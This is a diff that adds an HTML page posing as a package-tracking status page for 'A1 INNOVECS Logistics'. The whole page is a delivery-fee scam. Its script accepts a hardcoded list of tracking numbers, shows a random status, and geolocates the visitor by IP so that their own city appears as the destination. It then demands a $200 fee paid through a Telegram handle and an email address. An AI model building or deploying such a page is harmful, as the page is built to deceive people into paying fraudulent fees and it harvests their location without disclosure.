@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Package Status - A1 INNOVECS Logistics</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        line-height: 1.6;
+        color: #333;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+    }
+
+    .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 20px;
+    }
+
+    header {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+    }
+
+    nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem 0;
+    }
+
+    .logo {
+        font-size: 2rem;
+        font-weight: 800;
+        color: #667eea;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+    }
+
+    .back-btn {
+        background: linear-gradient(45deg, #667eea, #764ba2);
+        color: white;
+        padding: 12px 24px;
+        border: none;
+        border-radius: 25px;
+        cursor: pointer;
+        font-weight: 600;
+        transition: all 0.3s ease;
+        text-decoration: none;
+        display: inline-block;
+    }
+
+    .back-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+    }
+
+    .status-container {
+        padding: 3rem 0;
+    }
+
+    .tracking-header {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(15px);
+        border-radius: 20px;
+        padding: 2rem;
+        margin-bottom: 2rem;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+        text-align: center;
+    }
+
+    .tracking-number {
+        font-size: 2rem;
+        color: #667eea;
+        font-weight: 700;
+        margin-bottom: 0.5rem;
+    }
+
+    .tracking-subtitle {
+        color: #666;
+        font-size: 1.1rem;
+    }
+
+    .status-card {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(15px);
+        border-radius: 20px;
+        padding: 2.5rem;
+        margin-bottom: 2rem;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+    }
+
+    .status-timeline {
+        position: relative;
+    }
+
+    .timeline-item {
+        display: flex;
+        align-items: flex-start;
+        margin-bottom: 2rem;
+        position: relative;
+    }
+
+    .timeline-item:last-child {
+        margin-bottom: 0;
+    }
+
+    .timeline-icon {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.2rem;
+        margin-right: 1.5rem;
+        flex-shrink: 0;
+    }
+
+    .timeline-icon.completed {
+        background: linear-gradient(45deg, #4CAF50, #45a049);
+        color: white;
+    }
+
+    .timeline-icon.current {
+        background: linear-gradient(45deg, #667eea, #764ba2);
+        color: white;
+        animation: pulse 2s infinite;
+    }
+
+    .timeline-icon.pending {
+        background: #f0f0f0;
+        color: #999;
+    }
+
+    @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(102, 126, 234, 0.7); }
+        70% { box-shadow: 0 0 0 10px rgba(102, 126, 234, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(102, 126, 234, 0); }
+    }
+
+    .timeline-content {
+        flex: 1;
+    }
+
+    .timeline-title {
+        font-size: 1.2rem;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 0.5rem;
+    }
+
+    .timeline-description {
+        color: #666;
+        margin-bottom: 0.5rem;
+    }
+
+    .timeline-time {
+        color: #999;
+        font-size: 0.9rem;
+    }
+
+    .timeline-line {
+        position: absolute;
+        left: 25px;
+        top: 50px;
+        width: 2px;
+        height: calc(100% - 50px);
+        background: linear-gradient(to bottom, #667eea, #f0f0f0);
+    }
+
+    .package-details {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 2rem;
+        margin-bottom: 2rem;
+    }
+
+    .detail-card {
+        background: #f8f9fa;
+        padding: 1.5rem;
+        border-radius: 15px;
+        border-left: 4px solid #667eea;
+    }
+
+    .detail-title {
+        font-weight: 600;
+        color: #667eea;
+        margin-bottom: 1rem;
+        font-size: 1.1rem;
+    }
+
+    .detail-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0.5rem 0;
+        border-bottom: 1px solid #eee;
+    }
+
+    .detail-item:last-child {
+        border-bottom: none;
+    }
+
+    .detail-label {
+        color: #666;
+        font-weight: 500;
+    }
+
+    .detail-value {
+        color: #333;
+        font-weight: 600;
+    }
+
+    .fee-alert {
+        background: linear-gradient(45deg, #ff9a9e, #fad0c4);
+        color: #8b0000;
+        padding: 2rem;
+        border-radius: 15px;
+        text-align: center;
+        margin-top: 2rem;
+        box-shadow: 0 10px 30px rgba(255, 154, 158, 0.3);
+    }
+
+    .fee-amount {
+        font-size: 2.5rem;
+        font-weight: 800;
+        margin: 1rem 0;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    .fee-description {
+        font-size: 1.1rem;
+        margin-bottom: 1rem;
+    }
+
+    .contact-info {
+        background: rgba(102, 126, 234, 0.1);
+        padding: 1rem;
+        border-radius: 10px;
+        font-size: 0.9rem;
+    }
+
+    .status-badge {
+        display: inline-block;
+        padding: 6px 12px;
+        border-radius: 20px;
+        font-size: 0.85rem;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+
+    .status-in-transit {
+        background: linear-gradient(45deg, #667eea, #764ba2);
+        color: white;
+    }
+
+    .status-delivered {
+        background: linear-gradient(45deg, #4CAF50, #45a049);
+        color: white;
+    }
+
+    .status-pending {
+        background: linear-gradient(45deg, #ff9800, #f57c00);
+        color: white;
+    }
+
+    .footer {
+        background: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 2rem 0;
+        text-align: center;
+        margin-top: 3rem;
+    }
+
+    @media (max-width: 768px) {
+        .package-details {
+            grid-template-columns: 1fr;
+        }
+
+        .tracking-number {
+            font-size: 1.5rem;
+        }
+
+        .status-card {
+            padding: 1.5rem;
+        }
+    }
+
+    .loading {
+        text-align: center;
+        padding: 3rem;
+        color: white;
+        font-size: 1.2rem;
+    }
+
+    .error-message {
+        background: rgba(255, 255, 255, 0.95);
+        padding: 3rem;
+        border-radius: 20px;
+        text-align: center;
+        color: #c33;
+    }
+</style>
+
+
+</head>
+<body>
+    <header>
+        <nav class="container">
+            <div class="logo">A1 INNOVECS</div>
+            <a href="index.html" class="back-btn">← Back to Home</a>
+        </nav>
+    </header>
+
+
+<main class="container">
+    <div class="status-container">
+        <div id="loadingMessage" class="loading">
+            <h2>Loading package information...</h2>
+            <p>Please wait while we fetch your tracking details.</p>
+        </div>
+
+        <div id="trackingContent" style="display: none;">
+            <div class="tracking-header">
+                <div class="tracking-number" id="trackingNumber"></div>
+                <div class="tracking-subtitle">Package Tracking Information</div>
+            </div>
+
+            <div class="package-details">
+                <div class="detail-card">
+                    <div class="detail-title">📦 Package Information</div>
+                    <div class="detail-item">
+                        <span class="detail-label">Status:</span>
+                        <span class="detail-value" id="packageStatus"></span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Service Type:</span>
+                        <span class="detail-value">Express Delivery</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Weight:</span>
+                        <span class="detail-value">2.5 lbs</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Dimensions:</span>
+                        <span class="detail-value">12" × 8" × 4"</span>
+                    </div>
+                </div>
+
+                <div class="detail-card">
+                    <div class="detail-title">📍 Shipping Information</div>
+                    <div class="detail-item">
+                        <span class="detail-label">Origin:</span>
+                        <span class="detail-value">Niagara Falls, NY</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Destination:</span>
+                        <span class="detail-value" id="destination">Detecting location...</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Estimated Delivery:</span>
+                        <span class="detail-value">2-3 Business Days</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Last Update:</span>
+                        <span class="detail-value" id="lastUpdate"></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="status-card">
+                <h3 style="margin-bottom: 2rem; color: #333; font-size: 1.5rem;">📋 Tracking Timeline</h3>
+                <div class="status-timeline">
+                    <div class="timeline-line"></div>
+
+                    <div class="timeline-item">
+                        <div class="timeline-icon completed">✓</div>
+                        <div class="timeline-content">
+                            <div class="timeline-title">Package Processed</div>
+                            <div class="timeline-description">Your package has been received and processed at our Niagara Falls facility</div>
+                            <div class="timeline-time">September 8, 2025 - 10:30 AM</div>
+                        </div>
+                    </div>
+
+                    <div class="timeline-item">
+                        <div class="timeline-icon completed">✓</div>
+                        <div class="timeline-content">
+                            <div class="timeline-title">In Transit</div>
+                            <div class="timeline-description">Package departed from origin facility and is on its way</div>
+                            <div class="timeline-time">September 9, 2025 - 6:45 AM</div>
+                        </div>
+                    </div>
+
+                    <div class="timeline-item">
+                        <div class="timeline-icon current">🚚</div>
+                        <div class="timeline-content">
+                            <div class="timeline-title">Out for Delivery</div>
+                            <div class="timeline-description">Your package is currently out for delivery and will arrive today</div>
+                            <div class="timeline-time">September 10, 2025 - 8:15 AM</div>
+                        </div>
+                    </div>
+
+                    <div class="timeline-item">
+                        <div class="timeline-icon pending">📬</div>
+                        <div class="timeline-content">
+                            <div class="timeline-title">Delivered</div>
+                            <div class="timeline-description">Package will be delivered to your specified address</div>
+                            <div class="timeline-time">Estimated: Today by 6:00 PM</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="fee-alert">
+                <h3>⚠ Delivery Fee Required</h3>
+                <div class="fee-amount">$200.00</div>
+                <div class="fee-description">
+                    A delivery fee is currently pending for this package. Please contact our support team to complete payment and ensure successful delivery.
+                </div>
+                <div class="contact-info">
+                    <strong>Contact Support:</strong><br>
+                    📧 Email: support@innovecsllc.com<br>
+                    💬 Telegram: @innovecssupport<br>
+                    🕒 Available 24/7
+                </div>
+            </div>
+        </div>
+
+        <div id="errorMessage" class="error-message" style="display: none;">
+            <h2>❌ Invalid Tracking Number</h2>
+            <p>The tracking number you entered is not valid or does not exist in our system.</p>
+            <p style="margin-top: 1rem;">
+                <a href="index.html" class="back-btn">← Return to Tracking</a>
+            </p>
+        </div>
+    </div>
+</main>
+
+<footer class="footer">
+    <div class="container">
+        <p>&copy; 2025 A1 INNOVECS Logistics. All rights reserved. | Professional Delivery Solutions</p>
+    </div>
+</footer>
+
+<script>
+    // Valid tracking numbers array - must match the main site
+    const validTrackingNumbers = [
+        'A1X7K9M2P', 'B3N8R5Q1W', 'C9F2L6Y4T', 'D4H7V3Z8G', 'E6M1X9K5N',
+        'F8Q3B7R2S', 'G2W9T4J6L', 'H5Z8P1C3V', 'J7M4N9X2K', 'K1R6Q8F3B',
+        'L9Y2T7H5G', 'M3V8Z1W4P', 'N6K5L9R7Q', 'P4B3X8M1C', 'Q8F7V2N6J',
+        'R2G9K4T1Z', 'S5L8Q3W7Y', 'T9H6P2M4X', 'V1C7R5B8N', 'W3Z4K9L6Q'
+    ];
+
+    // Package status variations for different tracking numbers
+    const packageStatuses = [
+        'Out for Delivery',
+        'In Transit',
+        'Processing at Facility',
+        'Arrived at Destination',
+        'Ready for Pickup'
+    ];
+
+    // Function to get user's location based on IP
+    async function getUserLocation() {
+        try {
+            // Try multiple IP geolocation services for reliability
+            const services = [
+                'https://ipapi.co/json/',
+                'https://api.ipify.org?format=json', // Fallback - just gets IP
+                'https://ipinfo.io/json'
+            ];
+
+            for (let service of services) {
+                try {
+                    const response = await fetch(service);
+                    const data = await response.json();
+
+                    if (service.includes('ipapi.co')) {
+                        if (data.city && data.region) {
+                            return `${data.city}, ${data.region}`;
+                        }
+                    } else if (service.includes('ipinfo.io')) {
+                        if (data.city && data.region) {
+                            return `${data.city}, ${data.region}`;
+                        }
+                    }
+                } catch (error) {
+                    console.log(`Service ${service} failed, trying next...`);
+                    continue;
+                }
+            }
+
+            // If all services fail, return default
+            return 'Your Location';
+
+        } catch (error) {
+            console.error('Error getting user location:', error);
+            return 'Your Location';
+        }
+    }
+
+    // Alternative function using browser geolocation API (requires user permission)
+    function getBrowserLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve('Your Location');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    try {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        // Use reverse geocoding to get city/state
+                        const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`);
+                        const data = await response.json();
+
+                        if (data.city && data.principalSubdivision) {
+                            resolve(`${data.city}, ${data.principalSubdivision}`);
+                        } else {
+                            resolve('Your Location');
+                        }
+                    } catch (error) {
+                        resolve('Your Location');
+                    }
+                },
+                () => {
+                    // User denied permission or error occurred
+                    resolve('Your Location');
+                },
+                { timeout: 5000 }
+            );
+        });
+    }
+
+    function getUrlParameter(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name);
+    }
+
+    function getRandomStatus() {
+        return packageStatuses[Math.floor(Math.random() * packageStatuses.length)];
+    }
+
+    function getCurrentDateTime() {
+        const now = new Date();
+        return now.toLocaleDateString() + ' - ' + now.toLocaleTimeString();
+    }
+
+    function loadTrackingInfo() {
+        const trackingNumber = getUrlParameter('tracking');
+
+        // Start getting user location immediately
+        const locationPromise = getUserLocation();
+
+        // Simulate loading time
+        setTimeout(async () => {
+            document.getElementById('loadingMessage').style.display = 'none';
+
+            if (!trackingNumber || !validTrackingNumbers.includes(trackingNumber.toUpperCase())) {
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+
+            // Display tracking information
+            document.getElementById('trackingNumber').textContent = trackingNumber.toUpperCase();
+
+            // Set random status with appropriate badge
+            const status = getRandomStatus();
+            const statusElement = document.getElementById('packageStatus');
+            statusElement.innerHTML = `<span class="status-badge status-in-transit">${status}</span>`;
+
+            // Set current time as last update
+            document.getElementById('lastUpdate').textContent = getCurrentDateTime();
+
+            // Get and set user location as destination
+            try {
+                const userLocation = await locationPromise;
+                document.getElementById('destination').textContent = userLocation;
+
+                // Update timeline descriptions to include user's location
+                updateTimelineWithLocation(userLocation);
+            } catch (error) {
+                document.getElementById('destination').textContent = 'Your Location';
+            }
+
+            document.getElementById('trackingContent').style.display = 'block';
+        }, 1500);
+    }
+
+    // Function to update timeline with user's location
+    function updateTimelineWithLocation(location) {
+        const timelineItems = document.querySelectorAll('.timeline-description');
+        if (timelineItems.length >= 3) {
+            timelineItems[2].textContent = `Your package is currently out for delivery to ${location}`;
+        }
+        if (timelineItems.length >= 4) {
+            timelineItems[3].textContent = `Package will be delivered to your address in ${location}`;
+        }
+    }
+
+    // Load tracking info when page loads
+    document.addEventListener('DOMContentLoaded', loadTrackingInfo);
+</script>
+
+
+</body>
+</html>
